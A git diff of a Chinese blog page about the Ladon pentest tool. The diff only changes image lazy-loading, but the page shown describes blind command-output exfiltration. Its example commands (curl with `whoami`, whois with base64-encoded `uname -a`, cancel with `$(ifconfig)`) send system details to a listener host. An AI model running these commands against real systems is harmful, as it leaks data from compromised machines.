@@ -70,7 +70,7 @@
     https://www.cnblogs.com/skins/CodingLife/images/title-yellow.png)">
     <div class="main-header-box">
         <a class="header-avatar" href="/" title="K8gege">
-            <img alt="logo" class="img-responsive" referrerpolicy="no-referrer" data-original="/../images/avatar.png">
+            <img alt="logo" class="img-responsive" referrerpolicy="no-referrer" class="lazyload" data-src="/../images/avatar.png">
 			<h3 class="K8tilte">K8哥哥</h3>
         </a>
         <div class="branding">
@@ -215,7 +215,7 @@
 <h4 id="保存txt">保存txt</h4>
 <p><a target="_blank" rel="noopener" href="http://192.168.1.131:800/deb64txt/MTIzMTIzMTIzMTIzMTI=">http://192.168.1.131:800/deb64txt/MTIzMTIzMTIzMTIzMTI=</a><br>
 <a target="_blank" rel="noopener" href="http://192.168.1.131:800/debase64txt/MTIzMTIzMTIzMTIzMTI=">http://192.168.1.131:800/debase64txt/MTIzMTIzMTIzMTIzMTI=</a></p>
-<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exe/Ladon8.1_web_echo.PNG"></p>
+<p><img alt="使用http访问查看图片" class="lazyload" data-src="/k8img/Ladon/exe/Ladon8.1_web_echo.PNG"></p>
 <h3 id="curl回显">curl回显</h3>
 <h4 id="命令回显">命令回显</h4>
 <figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://192.168.250.21:800/getstr/`<span class="built_in">whoami</span>`</span><br></pre></td></tr></tbody></table></figure>
@@ -227,13 +227,13 @@
 <p>Ladon 8.3的Web或Gui版的NC均可回显，无论是否BASE64加密，Ladon均可完美支持</p>
 <figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop# whois -h 192.168.250.27 -p 800 `<span class="built_in">uname</span> -a|<span class="built_in">base64</span>`</span><br><span class="line">Timeout.</span><br><span class="line"></span><br><span class="line">root@kali:~/Desktop# whois -h 192.168.250.27 -p 800 `<span class="built_in">uname</span> -a`</span><br><span class="line">Timeout.</span><br></pre></td></tr></tbody></table></figure>
 <h4 id="Ladon-nc回显">Ladon nc回显</h4>
-<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exe/whois_nc.PNG"></p>
+<p><img alt="使用http访问查看图片" class="lazyload" data-src="/k8img/Ladon/exe/whois_nc.PNG"></p>
 <h4 id="Ladon-Web回显">Ladon Web回显</h4>
-<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exe/ladon_whois.PNG"></p>
+<p><img alt="使用http访问查看图片" class="lazyload" data-src="/k8img/Ladon/exe/ladon_whois.PNG"></p>
 <h3 id="cancel回显">cancel回显</h3>
 <figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop# cancel -u <span class="string">"<span class="subst">$(ifconfig)</span>"</span> -h 192.168.250.27:800</span><br></pre></td></tr></tbody></table></figure>
 <p>cancel明文回显结果在Brequesting-username和"my-jobs之中</p>
-<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exe/linux_cancel.PNG"></p>
+<p><img alt="使用http访问查看图片" class="lazyload" data-src="/k8img/Ladon/exe/linux_cancel.PNG"></p>
 <h3 id="小结">小结</h3>
 <p>本文主要使用Ladon的WEB与NC实现回显，实战中很多机器可能并不能DNS解析，意味着DNSLOG方法无效，但是Ladon可以完美解决DNS不解析导致DNSLOG失效的问题。</p>
 <h3 id="Download">Download</h3>
@@ -248,7 +248,7 @@
     
     <div class="reward" ontouchstart="">
     <div class="reward-wrap">
-	<img height="180" width="180" data-original="../images/k8join2.png">
+	<img height="180" width="180" class="lazyload" data-src="../images/k8join2.png">
 
     </div>
     <p class="reward-tip">
